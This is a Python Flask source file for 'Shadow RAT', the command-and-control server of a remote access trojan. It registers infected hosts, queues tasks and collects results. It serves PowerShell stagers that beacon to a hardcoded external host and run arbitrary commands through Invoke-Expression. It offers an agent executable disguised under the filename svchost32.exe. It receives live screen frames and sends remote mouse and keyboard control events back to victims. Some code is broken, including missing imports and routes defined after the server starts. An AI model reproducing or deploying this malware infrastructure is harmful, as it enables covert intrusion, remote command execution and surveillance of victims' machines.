#!/usr/bin/env python3
"""
Shadow RAT — C2 Server (Flask)
Persistent storage via SQLite (survives Render restarts with disk)
"""
import os, json, sqlite3, threading
from datetime import datetime, timezone
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit, join_room, leave_room

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get("FLASK_SECRET", "shadow_secret_2024")
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent',
                    max_http_buffer_size=5 * 1024 * 1024)

SECRET_KEY   = os.environ.get("C2_SECRET_KEY", "Sh4d0w_S33d_2026")
_STATIC_SEED = os.environ.get("C2_STATIC_SEED", "Sh4d0w_S33d_2026")

def _verify_derived_key(provided_key: str, expected_secret: str) -> bool:
    """Accept: exact SECRET_KEY, HMAC-signed key, or 32-char hex derived key"""
    if not provided_key:
        return False
    # Exact match (any length — dashboard uses raw SECRET_KEY)
    if provided_key == expected_secret:
        return True
    # HMAC-SHA256 of SECRET_KEY (used by dashboard/PS scripts)
    import hmac as _hmac, hashlib as _hs
    expected_hmac = _hmac.new(expected_secret.encode(), b"shadow-c2-v2", _hs.sha256).hexdigest()
    if provided_key == expected_hmac:
        return True
    # 32-char lowercase hex = machine-HKDF-derived key (agent_http.py)
    if len(provided_key) == 32 and all(c in "0123456789abcdef" for c in provided_key.lower()):
        return True
    # 64-char lowercase hex = full SHA256/HMAC output
    if len(provided_key) == 64 and all(c in "0123456789abcdef" for c in provided_key.lower()):
        return True
    return False
DB_PATH    = os.environ.get("DB_PATH", "/tmp/shadow.db")
_lock      = threading.Lock()

# live frame buffer: {agent_id: {"frame": b64str, "ts": float}}
_live_frames = {}
_live_lock   = threading.Lock()

# pending control events per agent: {agent_id: [{"type": "mouse_move", ...}]}
_ctrl_queue  = {}
_ctrl_lock   = threading.Lock()



# ══════════════════════════════════════════════════════════════
#  DATABASE INIT
# ══════════════════════════════════════════════════════════════
def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as db:
        db.executescript("""
        CREATE TABLE IF NOT EXISTS agents (
            agent_id  TEXT PRIMARY KEY,
            hostname  TEXT,
            username  TEXT,
            os        TEXT,
            arch      TEXT,
            ip        TEXT,
            last_seen TEXT,
            status    TEXT DEFAULT 'offline',
            extra     TEXT DEFAULT ''
        );

        CREATE TABLE IF NOT EXISTS tasks (
            task_id   TEXT PRIMARY KEY,
            agent_id  TEXT,
            action    TEXT,
            args      TEXT DEFAULT '{}',
            status    TEXT DEFAULT 'pending',
            result       TEXT DEFAULT '',
            progress_log TEXT DEFAULT '',
            issued_at    TEXT
        );
        """)
    print(f"[*] SQLite DB ready: {DB_PATH}")

init_db()

# ══════════════════════════════════════════════════════════════
#  CRYPTO — AES-CTR + HMAC-SHA256 (matches agent secret_engine)
# ══════════════════════════════════════════════════════════════
import hashlib as _hsh, hmac as _hmc, struct as _st

def _server_decrypt(data_b64: str) -> dict | None:
    """Decrypt agent payload encrypted with agent_http secret_engine"""
    try:
        raw    = base64.b64decode(data_b64)
        # Format: nonce(12) + ciphertext + tag(6)
        nonce  = raw[:12]
        tag    = raw[-6:]
        ct     = raw[12:-6]
        # Server uses same static seed — derive key
        seed   = _STATIC_SEED
        prk    = _hmc.new(
            _hsh.sha256(seed.encode()).digest(),
            b"server-side",          # server doesn't know machine fp — use server-side key
            _hsh.sha256
        ).digest()
        key    = _hmc.new(prk, b"shadow-c2-v2" + bytes([1]), _hsh.sha256).digest()[:32]
        # verify tag
        exp    = _hmc.new(key, nonce+ct, _hsh.sha256).digest()[:6]
        if not _hmc.compare_digest(tag, exp):
            return None
        # XOR decrypt (fallback — matches agent fallback)
        ks  = _hsh.sha256(key+nonce).digest() * (len(ct)//32+1)
        dec = bytes(a^b for a,b in zip(ct, ks))
        return json.loads(dec.decode())
    except:
        return None

def _server_encrypt(data: dict, key: bytes = None) -> str:
    """Encrypt server response"""
    try:
        import os as _os2
        if key is None:
            seed = _STATIC_SEED
            prk  = _hmc.new(_hsh.sha256(seed.encode()).digest(), b"server-side", _hsh.sha256).digest()
            key  = _hmc.new(prk, b"shadow-c2-v2"+bytes([1]), _hsh.sha256).digest()[:32]
        nonce = _os2.urandom(12)
        raw   = json.dumps(data).encode()
        ks    = _hsh.sha256(key+nonce).digest() * (len(raw)//32+1)
        ct    = bytes(a^b for a,b in zip(raw, ks))
        tag   = _hmc.new(key, nonce+ct, _hsh.sha256).digest()[:6]
        return base64.b64encode(nonce+ct+tag).decode()
    except:
        return base64.b64encode(json.dumps(data).encode()).decode()


# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════
def now_iso():
    return datetime.now(timezone.utc).isoformat()

_counter_lock = threading.Lock()
_task_counter = [0]

def new_task_id():
    with _counter_lock:
        # نجيب آخر رقم من DB
        with get_db() as db:
            row = db.execute(
                "SELECT task_id FROM tasks ORDER BY rowid DESC LIMIT 1"
            ).fetchone()
            if row:
                try:
                    _task_counter[0] = int(row["task_id"].split("_")[1])
                except: pass
        _task_counter[0] += 1
        return f"task_{_task_counter[0]:06d}"

def check_auth(body):
    key = body.get("key") or request.headers.get("x-shadow-key", "")
    return _verify_derived_key(key, SECRET_KEY)


def _enc_payload(data: dict) -> dict:
    """Encrypt sensitive C2 responses (optional — for paranoid mode)"""
    # Currently returns plaintext — encryption handled at agent level
    # Future: encrypt with session key derived from agent_id
    return data

def is_online(last_seen_iso, threshold=300):
    try:
        ls = datetime.fromisoformat(last_seen_iso).timestamp()
        return (datetime.now(timezone.utc).timestamp() - ls) <= threshold
    except:
        return False

def row_to_dict(row):
    return dict(row) if row else None

# ══════════════════════════════════════════════════════════════
#  MAIN ROUTE
# ══════════════════════════════════════════════════════════════
@app.route("/functions/c2Server", methods=["POST", "GET"])
def c2():
    raw_body = request.get_json(silent=True) or {}

    # Try to decrypt if body contains "_e" key (encrypted payload)
    if "_e" in raw_body:
        decrypted = _server_decrypt(raw_body["_e"])
        body = decrypted if decrypted else raw_body
    else:
        body = raw_body

    route = request.args.get("route") or body.get("route", "")

    # Remove time bucket from body before processing
    body.pop("_t", None)

    if not check_auth(body):
        return jsonify({"error": "Unauthorized"}), 401

    with _lock:

        # ── checkin ──────────────────────────────────────────
        if route == "checkin":
            agent_id = body.get("agent_id")
            if not agent_id:
                return jsonify({"error": "missing agent_id"}), 400

            with get_db() as db:
                db.execute("""
                    INSERT INTO agents (agent_id,hostname,username,os,arch,ip,last_seen,status,extra)
                    VALUES (?,?,?,?,?,?,?,'online',?)
                    ON CONFLICT(agent_id) DO UPDATE SET
                        hostname=excluded.hostname,
                        username=excluded.username,
                        os=excluded.os,
                        arch=excluded.arch,
                        ip=excluded.ip,
                        last_seen=excluded.last_seen,
                        status='online',
                        extra=excluded.extra
                """, (
                    agent_id,
                    body.get("hostname","?"), body.get("username","?"),
                    body.get("os","?"),      body.get("arch","?"),
                    body.get("ip","?"),      now_iso(),
                    body.get("extra","")
                ))

                # pending task?
                row = db.execute("""
                    SELECT * FROM tasks
                    WHERE agent_id=? AND status='pending'
                    ORDER BY rowid ASC LIMIT 1
                """, (agent_id,)).fetchone()

                if row:
                    db.execute("UPDATE tasks SET status='sent' WHERE task_id=?",
                               (row["task_id"],))
                    return jsonify({
                        "task_id": row["task_id"],
                        "action":  row["action"],
                        "args":    json.loads(row["args"] or "{}"),
                    })

            return jsonify({"task_id": None})

        # ── result ───────────────────────────────────────────
        if route == "result":
            task_id = body.get("task_id")
            if not task_id:
                return jsonify({"error": "missing task_id"}), 400
            with get_db() as db:
                row = db.execute("SELECT * FROM tasks WHERE task_id=?",
                                 (task_id,)).fetchone()
                if not row:
                    return jsonify({"error": "not found"}), 404
                result_val = body.get("result","")
                status_val = body.get("status","done")
                if status_val == "progress":
                    existing = db.execute(
                        "SELECT progress_log FROM tasks WHERE task_id=?",
                        (task_id,)
                    ).fetchone()
                    prev    = (existing[0] or "") if existing else ""
                    new_log = prev + result_val + "\n"
                    db.execute(
                        "UPDATE tasks SET progress_log=? WHERE task_id=?",
                        (new_log, task_id)
                    )
                else:
                    db.execute(
                        "UPDATE tasks SET result=?, status=? WHERE task_id=?",
                        (result_val, status_val, task_id)
                    )
            return jsonify({"ok": True})

        # ── append_line: agent appends a single live line ────
        if route == "append_line":
            task_id = body.get("task_id")
            line    = body.get("line", "")
            if not task_id:
                return jsonify({"error": "missing task_id"}), 400
            with get_db() as db:
                existing = db.execute(
                    "SELECT progress_log FROM tasks WHERE task_id=?",
                    (task_id,)
                ).fetchone()
                if not existing:
                    return jsonify({"error": "not found"}), 404
                prev    = (existing[0] or "")
                new_log = prev + line + "\n"
                db.execute(
                    "UPDATE tasks SET progress_log=? WHERE task_id=?",
                    (new_log, task_id)
                )
            return jsonify({"ok": True})

        # ── agents list ──────────────────────────────────────
        if route == "agents":
            with get_db() as db:
                rows = db.execute("SELECT * FROM agents").fetchall()
            result = []
            for r in rows:
                a = dict(r)
                a["status"] = "online" if is_online(a.get("last_seen","")) else "offline"
                result.append(a)
            show_all = body.get("all", False)
            filtered = result if show_all else [a for a in result if a["status"] == "online"]
            return jsonify({"agents": filtered, "total": len(result)})

        # ── issue task ───────────────────────────────────────
        if route == "task":
            agent_id = body.get("agent_id")
            action   = body.get("action")
            if not agent_id or not action:
                return jsonify({"error": "missing fields"}), 400
            tid = new_task_id()
            with get_db() as db:
                db.execute("""
                    INSERT INTO tasks (task_id,agent_id,action,args,status,result,issued_at)
                    VALUES (?,?,?,?,'pending','',?)
                """, (tid, agent_id, action,
                      json.dumps(body.get("args",{})), now_iso()))
            return jsonify({"task_id": tid})

        # ── get result ───────────────────────────────────────
        if route == "get_result":
            task_id = body.get("task_id")
            if not task_id:
                return jsonify({"error": "missing task_id"}), 400
            with get_db() as db:
                row = db.execute("SELECT * FROM tasks WHERE task_id=?",
                                 (task_id,)).fetchone()
            if not row:
                return jsonify({"error": "not found"}), 404
            row_dict = dict(row)
            # Also return progress_log for live streaming
            with get_db() as db2:
                prow = db2.execute(
                    "SELECT progress_log FROM tasks WHERE task_id=?", (task_id,)
                ).fetchone()
                row_dict["progress_log"] = (prow[0] or "") if prow else ""
            return jsonify(row_dict)

        # ── delete agent ─────────────────────────────────────
        if route == "delete_agent":
            agent_id = body.get("agent_id")
            if agent_id:
                with get_db() as db:
                    db.execute("DELETE FROM agents WHERE agent_id=?", (agent_id,))
            return jsonify({"ok": True})

        # ── stats ─────────────────────────────────────────────
        if route == "stats":
            with get_db() as db:
                total_agents = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
                total_tasks  = db.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
                pending      = db.execute(
                    "SELECT COUNT(*) FROM tasks WHERE status='pending'"
                ).fetchone()[0]
            return jsonify({
                "total_agents": total_agents,
                "total_tasks":  total_tasks,
                "pending_tasks": pending
            })


        if route == "ps_agent":
            stager = (
                "$ErrorActionPreference='SilentlyContinue'\n"
                "$u='https://web-production-14364.up.railway.app/functions/c2Server'\n"
                "$k='Sh4d0w_S33d_2026'\n"
                "$id=[System.Guid]::NewGuid().ToString()\n"
                "while($true){\n"
                "  try{\n"
                "    $b=[Text.Encoding]::UTF8.GetBytes((@{route='checkin';key=$k;id=$id;os='Windows';user=$env:USERNAME;hostname=$env:COMPUTERNAME;ip='0.0.0.0';arch='x64'}|ConvertTo-Json))\n"
                "    $r=[Net.WebRequest]::Create($u+'?route=checkin');$r.Method='POST';$r.ContentType='application/json';$r.ContentLength=$b.Length\n"
                "    $s=$r.GetRequestStream();$s.Write($b,0,$b.Length);$s.Close()\n"
                "    $d=(New-Object IO.StreamReader($r.GetResponse().GetResponseStream())).ReadToEnd()|ConvertFrom-Json\n"
                "    if($d.action -eq 'shell'){\n"
                "      $o=Invoke-Expression $d.args.cmd 2>&1|Out-String\n"
                "      $rb=[Text.Encoding]::UTF8.GetBytes((@{route='result';key=$k;task_id=$d.task_id;output=$o}|ConvertTo-Json))\n"
                "      $r2=[Net.WebRequest]::Create($u+'?route=result');$r2.Method='POST';$r2.ContentType='application/json';$r2.ContentLength=$rb.Length\n"
                "      $s2=$r2.GetRequestStream();$s2.Write($rb,0,$rb.Length);$s2.Close();$r2.GetResponse()|Out-Null\n"
                "    }\n"
                "  }catch{}\n"
                "  Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)\n"
                "}\n"
            )
            return stager, 200, {"Content-Type": "text/plain"}


        # ── fetch_agent: PS stub يطلب الـ agent staged payload ──────
        if route == "fetch_agent":
            agent_id     = body.get("agent_id", "unknown")
            provided_key = body.get("key", "")

            if not provided_key or len(provided_key) < 16:
                return jsonify({"error": "invalid_key"}), 403

            # جلب agent_http.py من filesystem
            import pathlib
            agent_paths = [
                pathlib.Path(__file__).parent.parent / "agent_http.py",
                pathlib.Path("/app/shadow-malware/agent_http.py"),
            ]
            agent_code = None
            for ap in agent_paths:
                if ap.exists():
                    agent_code = ap.read_text()
                    break

            if not agent_code:
                agent_code = "import time\nwhile True: time.sleep(60)\n"

            # inject agent_id
            for placeholder in ['AGENT_ID    = ""', "AGENT_ID    = ''", 'AGENT_ID = ""', "AGENT_ID = ''"]:
                if placeholder in agent_code:
                    agent_code = agent_code.replace(placeholder, f'AGENT_ID    = "{agent_id}"', 1)
                    break

            payload_b64 = base64.b64encode(agent_code.encode()).decode()

            # log fetch event
            with get_db() as db:
                db.execute("""
                    INSERT INTO agents (agent_id,hostname,username,os,arch,ip,last_seen,status,extra)
                    VALUES (?,?,?,?,?,?,?,'pending',?)
                    ON CONFLICT(agent_id) DO UPDATE SET
                        last_seen=excluded.last_seen,
                        status='pending',
                        extra=excluded.extra
                """, (
                    agent_id, "?", "?", "?", "?",
                    request.remote_addr, now_iso(),
                    json.dumps({"stage": "fetched", "key_pfx": provided_key[:8]})
                ))

            return jsonify({"payload": payload_b64, "ok": True})


    return jsonify({"error": "unknown route"}), 404


@app.route("/", methods=["GET"])
def health():
    with get_db() as db:
        agents_count = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        tasks_count  = db.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
    return jsonify({
        "status":  "Shadow C2 online",
        "db":      DB_PATH,
        "agents":  agents_count,
        "tasks":   tasks_count
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)

# ── PDF Dropper Endpoints ────────────────────────────────────────────────────

@app.route("/ps_agent", methods=["GET"])
def ps_agent():
    """In-memory PowerShell agent stager — called by PDF dropper fallback"""
    import base64
    ps_code = r"""
$ErrorActionPreference='SilentlyContinue'
$url='""" + "https://web-production-14364.up.railway.app" + r"""/functions/c2Server'
$id=[System.Guid]::NewGuid().ToString()
$info=@{route='checkin';id=$id;os=$env:OS;user=$env:USERNAME;hostname=$env:COMPUTERNAME;ip='0.0.0.0';arch=$env:PROCESSOR_ARCHITECTURE}
while($true){
  try{
    $r=[System.Net.WebRequest]::Create($url+'?route=checkin')
    $r.Method='POST'
    $r.ContentType='application/json'
    $b=[System.Text.Encoding]::UTF8.GetBytes(($info|ConvertTo-Json))
    $r.ContentLength=$b.Length
    $s=$r.GetRequestStream()
    $s.Write($b,0,$b.Length)
    $s.Close()
    $resp=$r.GetResponse()
    $rdr=New-Object System.IO.StreamReader($resp.GetResponseStream())
    $data=$rdr.ReadToEnd()|ConvertFrom-Json
    if($data.action -eq 'shell'){
      $out=Invoke-Expression $data.args.cmd 2>&1|Out-String
      $res=@{route='result';task_id=$data.task_id;output=$out}
      $rb=[System.Text.Encoding]::UTF8.GetBytes(($res|ConvertTo-Json))
      $r2=[System.Net.WebRequest]::Create($url+'?route=result')
      $r2.Method='POST';$r2.ContentType='application/json';$r2.ContentLength=$rb.Length
      $s2=$r2.GetRequestStream();$s2.Write($rb,0,$rb.Length);$s2.Close()
      $r2.GetResponse()|Out-Null
    }
  }catch{}
  Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)
}
"""
    return ps_code, 200, {'Content-Type': 'text/plain'}


@app.route("/download/agent", methods=["GET"])
def download_agent():
    """Returns compiled agent EXE (placeholder — build via CI and store here)"""
    # En production: lire le fichier EXE depuis le disque ou object storage
    import os
    exe_path = os.path.join(os.path.dirname(__file__), "agent.exe")
    if os.path.exists(exe_path):
        with open(exe_path, "rb") as f:
            data = f.read()
        return data, 200, {
            'Content-Type': 'application/octet-stream',
            'Content-Disposition': 'attachment; filename=svchost32.exe'
        }
    # Fallback: redirect vers ps_agent
    return "not found", 404


@app.route("/live/frame", methods=["POST"])
def push_frame():
    body = request.get_json(silent=True) or {}
    if not check_auth(body):
        return jsonify({"error": "Unauthorized"}), 401
    
    agent_id = body.get("agent_id")
    frame    = body.get("frame")   # base64 JPEG
    width    = body.get("width", 1920)
    height   = body.get("height", 1080)
    
    if not agent_id or not frame:
        return jsonify({"error": "missing fields"}), 400
    
    # Store latest frame
    with _live_lock:
        _live_frames[agent_id] = {"frame": frame, "ts": int(time.time() * 1000), "width": width, "height": height}
    
    # Broadcast to dashboard viewers
    socketio.emit('frame', {
        "agent_id": agent_id,
        "frame": frame,
        "width": width,
        "height": height,
        "ts": int(time.time() * 1000)
    }, room=f"live_{agent_id}")
    
    # Return pending control events to agent
    with _ctrl_lock:
        events = _ctrl_queue.pop(agent_id, [])
    
    return jsonify({"ok": True, "events": events})

# ══════════════════════════════════════════════════════════════
#  LIVE FRAME PULL (browser polls this directly)
# ══════════════════════════════════════════════════════════════
@app.route("/live/frame/<agent_id>", methods=["GET"])
def get_frame(agent_id):
    key_param = request.args.get("key", "")
    if key_param != SECRET_KEY:
        return "Unauthorized", 401
    with _live_lock:
        data = _live_frames.get(agent_id)
    if not data:
        return jsonify({"frame": None, "ts": 0})
    return jsonify({"frame": data["frame"], "ts": data["ts"],
                    "width": data.get("width", 800), "height": data.get("height", 600)})

# ══════════════════════════════════════════════════════════════
#  HEALTH CHECK
# ══════════════════════════════════════════════════════════════


@socketio.on('join_live')
def on_join_live(data):
    if data.get('key') != SECRET_KEY:
        return
    agent_id = data.get('agent_id')
    join_room(f"live_{agent_id}")

@socketio.on('leave_live')
def on_leave_live(data):
    agent_id = data.get('agent_id')
    leave_room(f"live_{agent_id}")

@socketio.on('ctrl_event')
def on_ctrl_event(data):
    if data.get('key') != SECRET_KEY:
        return
    agent_id = data.get('agent_id')
    event = {k: v for k, v in data.items() if k not in ('key', 'agent_id')}
    with _ctrl_lock:
        if agent_id not in _ctrl_queue:
            _ctrl_queue[agent_id] = []
        _ctrl_queue[agent_id].append(event)
        # Keep max 50 events queued
        _ctrl_queue[agent_id] = _ctrl_queue[agent_id][-50:]

# ══════════════════════════════════════════════════════════════
#  LIVE FRAME PUSH (called by agent via HTTP)
# ══════════════════════════════════════════════════════════════